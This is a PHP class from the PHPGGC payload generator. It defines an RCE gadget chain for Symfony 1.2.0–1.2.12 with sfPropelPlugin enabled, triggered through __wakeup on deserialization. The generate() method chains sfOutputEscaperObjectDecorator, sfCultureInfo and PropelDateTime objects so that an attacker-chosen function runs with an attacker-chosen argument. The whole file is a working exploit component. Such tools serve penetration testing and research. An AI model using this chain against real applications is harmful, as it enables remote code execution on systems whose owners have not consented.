<?php

namespace GadgetChain\Symfony;

class RCE14 extends \PHPGGC\GadgetChain\RCE\FunctionCall
{
    public static $version = '1.2.0 <= 1.2.12';
    public static $vector = '__wakeup';
    public static $author = 'darkpills';
    public static $information = 'Requires sfPropelPlugin to be enabled';

    public function generate(array $parameters)
    {
        $escaper = new \sfOutputEscaperObjectDecorator($parameters['function'], new \sfCultureInfo($parameters['parameter']));
        $date = new \PropelDateTime(null, $escaper);

        return $date;
    }
}
